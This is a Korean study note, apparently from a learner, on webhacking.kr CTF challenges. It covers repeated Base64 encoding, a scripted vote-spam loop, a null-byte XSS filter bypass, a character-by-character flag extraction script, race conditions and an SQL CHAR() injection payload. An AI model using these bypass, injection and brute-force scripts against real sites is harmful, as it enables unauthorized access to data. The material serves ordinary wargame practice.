# CTF / Web Hacking 학습 정리 (2026-07-06)

오늘 실습한 코드들과 사용된 개념들을 정리했다. 코드가 어떤 의미인지, 언제 사용되는지, 어떤 방식으로 동작하는지 중심으로 기록하였다.

---

## 1. Base64 반복 인코딩

### 코드

```python
import base64

id = b"admin"
pw = b"nimda"

encode_id = id
encode_pw = pw

for i in range(20):
    encode_id = base64.b64encode(encode_id)
    encode_pw = base64.b64encode(encode_pw)

print(encode_id)
print(encode_pw)
```

### 코드 설명

```python
id = b"admin"
pw = b"nimda"
```

* `b`는 바이트(Byte) 문자열을 의미한다.
* Base64 함수는 문자열보다 바이트 형식 데이터를 주로 사용한다.

```python
encode_id = id
encode_pw = pw
```

* 원본 데이터를 복사한다.
* 이후 반복 인코딩 과정에서 계속 변경된다.

```python
for i in range(20):
```

* 반복문 20회 수행
* `range(20)` → 0부터 19까지

```python
encode_id = base64.b64encode(encode_id)
```

* 현재 값을 Base64 인코딩
* 결과를 다시 자기 자신에게 저장

### 동작 과정

1. admin 저장
2. Base64 수행
3. 결과값 다시 Base64 수행
4. 총 20번 반복
5. 최종 인코딩 값 출력

### 언제 사용하는가?

CTF 문제에서 자주 등장한다.

예시:

* 반복 인코딩 문제
* 쿠키 분석
* 토큰 분석
* 데이터 전달 방식 확인

### 주의사항

Base64는 암호화가 아니다.

단순히 데이터를 다른 문자 형식으로 표현하는 **인코딩 방식**이다.

---

## 2. Python requests 반복 요청

### 코드

```python
import requests

for i in range(0,100,1):
    url='https://webhacking.kr/challenge/code-5/?hit=whoti'

    cookie={
        'PHPSESSID':'j9trs32mhfsk69ncd5me8q27fo',
        'vote_check':'0'
    }

    requests.get(url,cookies=cookie)

    print(i)
```

### 코드 설명

```python
for i in range(0,100,1):
```

의미:

```python
시작값 = 0
끝값 = 100
증가값 = 1
```

총 100회 반복한다.

```python
requests.get(url,cookies=cookie)
```

의미:

* GET 요청 전송
* 쿠키 포함
* 브라우저가 요청하는 것처럼 동작

```python
cookie={
'PHPSESSID':'...',
'vote_check':'0'
}
```

의미:

* 세션 정보 저장
* 로그인 상태 유지 가능

### 동작 흐름

1. URL 지정
2. 쿠키 설정
3. 요청 전송
4. 반복 수행
5. 진행 상황 출력

### 언제 사용하는가?

자동화 작업에서 많이 사용된다.

예시:

* 반복 테스트
* 로그인 유지
* 데이터 수집
* CTF 자동화

---

## 3. Null Byte(%00) 문자열

### 예제

```html
<s%00c%00r%00i%00p%00t>alert(1)</script>
```

### 설명

`%00`

의미:

```text
NULL 문자
```

ASCII 값:

```text
0x00
```

### 사용 이유

일부 필터는 문자열을 그대로 검사한다.

예:

```text
script 차단
```

하지만 중간에 NULL 삽입:

```text
s%00c%00r%00i%00p%00t
```

필터가 제대로 처리하지 못하는 경우가 있었다.

### 사용되는 상황

* 입력 검증 실습
* 필터링 분석
* CTF 문제

---

## 4. 문자열 자동화 탐색 코드

### 코드

```python
import requests

CHALLENGE='https://webhacking.kr/challenge/web-33/'
SESSID='8b14bokub2931b4mokil0oq896'

headers={
'Cookie':'PHPSESSID='+SESSID
}

flag='flag{'

ascii_set='0123456789abcdefghijklmnopqrstuvwxyz!"#$&\'()*+,-./:;<=>?@[\\]^`{|}~_'

for i in range(64):

    old_len=len(flag)

    for c in ascii_set:

        data={
            'search':"{}".format(flag+c)
        }

        req=requests.post(
            url=CHALLENGE,
            headers=headers,
            data=data
        )

        if 'admin' in req.text:

            flag+=c

            print(
            'flag={}'.format(flag)
            )

            break

    if len(flag)==old_len:
        break
```

### 코드 설명

```python
flag='flag{'
```

시작 문자열 설정

```python
ascii_set='01234...'
```

가능한 문자 목록

```python
for c in ascii_set:
```

문자를 하나씩 시도

```python
flag+c
```

현재 문자열 뒤에 문자 추가

```python
if 'admin' in req.text:
```

응답 확인

문자 조건이 맞으면 저장

```python
flag+=c
```

문자 추가

### 동작 흐름

1. 시작 문자열 준비
2. 문자 하나 추가
3. 서버 응답 확인
4. 조건 만족 시 저장
5. 반복

### 학습 포인트

* Python 자동화
* 반복 처리
* 응답 분석
* 문자열 탐색

---

## 5. Race Condition (레이스 컨디션)

### 설명

여러 작업이 동시에 실행될 때 실행 순서가 꼬여 예상하지 못한 결과가 발생하는 문제

### 예시

은행 계좌:

현재 금액:

```text
10000원
```

동시에 두 명이:

```text
10000원 출금
```

정상:

```text
한 명만 성공
```

문제 발생:

```text
두 명 모두 성공
```

### 발생 이유

공유 자원 접근 제어 부족

### 방어 방법

* Lock 사용
* Mutex 사용
* Transaction 사용
* 동시성 제어 적용

---

## 6. SQL CHAR 함수

### 예제

```sql
?lv=0||id=char(97,100,109,105,110)
```

### 코드 설명

```sql
char(97,100,109,105,110)
```

ASCII 변환:

```text
97 = a
100 = d
109 = m
105 = i
110 = n
```

결과:

```text
admin
```

즉 실제 결과:

```sql
id='admin'
```

### 사용하는 이유

문자열을 숫자 형태로 표현할 수 있다.

### 사용되는 경우

* SQL 함수 학습
* 문자열 변환
* CTF 문제 분석

---

# 오늘 배운 핵심 요약

* Base64는 암호화가 아니라 인코딩이다.
* requests는 브라우저 요청 자동화 가능
* `%00`은 Null Byte
* 반복문을 이용하면 문자열 탐색 자동화 가능
* Race Condition은 동시 처리 문제
* CHAR()는 숫자를 문자로 변환하는 SQL 함수
